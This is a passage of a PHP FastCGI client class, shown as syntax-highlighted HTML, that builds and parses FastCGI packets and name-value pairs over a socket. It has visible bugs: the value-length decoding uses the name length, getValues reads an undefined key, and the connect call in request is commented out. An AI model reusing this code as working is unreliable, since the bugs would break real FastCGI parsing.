class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token 